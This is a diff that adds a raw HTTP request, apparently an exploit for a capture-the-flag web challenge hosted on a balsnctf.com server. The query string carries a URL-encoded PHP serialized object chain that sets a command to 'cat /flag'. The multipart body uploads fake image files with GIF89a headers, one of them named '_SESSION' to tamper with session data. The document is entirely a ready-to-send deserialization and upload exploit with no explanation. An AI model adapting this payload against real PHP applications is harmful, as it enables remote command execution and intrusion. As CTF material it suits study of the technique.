@@ -1,0 +1,21 @@
+POST /index.php?%3f=a%3A6%3A%7Bs%3A5%3A%2200000%22%3BO%3A11%3A%22L5D_Command%22%3A0%3A%7B%7Ds%3A5%3A%2200001%22%3BO%3A12%3A%22L5D_ResetCMD%22%3A1%3A%7BS%3A10%3A%22%00%5C2A%00new_cmd%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A5%3A%2200002%22%3BO%3A10%3A%22L5D_Upload%22%3A0%3A%7B%7Ds%3A5%3A%2200002%22%3Bb%3A1%3Bs%3A5%3A%2200001%22%3Bb%3A1%3Bs%3A5%3A%22-0000%22%3Bb%3A1%3B%7D HTTP/1.1
+Host: l5d.balsnctf.com:12345
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUhKwDY7bN6Nk4P3n
+Content-Length: 411
+
+------WebKitFormBoundaryUhKwDY7bN6Nk4P3n
+Content-Disposition: form-data; name="l5d_file"; filename="a.jpg"
+Content-Type: image/jpeg
+
+GIF89a
+xlogo_width 200
+xlogo_height 200
+------WebKitFormBoundaryUhKwDY7bN6Nk4P3n
+Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"
+Content-Type: image/jpeg
+
+GIF89a
+xlogo_width 200
+xlogo_height 200
+------WebKitFormBoundaryUhKwDY7bN6Nk4P3n--
